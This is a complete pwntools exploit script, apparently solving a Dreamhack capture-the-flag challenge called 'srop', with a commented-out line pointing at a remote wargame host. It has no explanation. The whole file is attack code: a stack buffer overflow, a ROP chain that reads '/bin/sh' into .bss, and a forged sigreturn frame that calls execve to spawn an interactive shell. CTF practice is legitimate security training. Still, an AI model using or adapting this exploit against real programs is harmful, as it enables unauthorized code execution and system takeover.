#!/usr/bin/python3
from pwn import *

p = process('./srop')
# p = remote('host3.dreamhack.games', 10653)
e = ELF('./srop')

read_plt = e.plt['read']
bss = 0x0000000000601500
prdi_ret = 0x0000000000400583
prsi_r15_ret = 0x00000000000400581
prax_syscall = 0x00000000004004eb
syscall_addr = 0x00000000004004ec

payload = b'A' * 24
payload += p64(prdi_ret)
payload += p64(0)
payload += p64(prsi_r15_ret)
payload += p64(bss)
payload += p64(0)
payload += p64(read_plt)
payload += p64(prax_syscall)
payload += p64(0xf)

sigFrame = SigreturnFrame(arch = 'amd64')
sigFrame.rax = 0x3b
sigFrame.rdi = bss
sigFrame.rsi = 0x0
sigFrame.rdx = 0x0
sigFrame.rip = syscall_addr

payload += bytes(sigFrame)

p.send(payload)
sleep(0.5)
p.send("/bin/sh\x00")

p.interactive()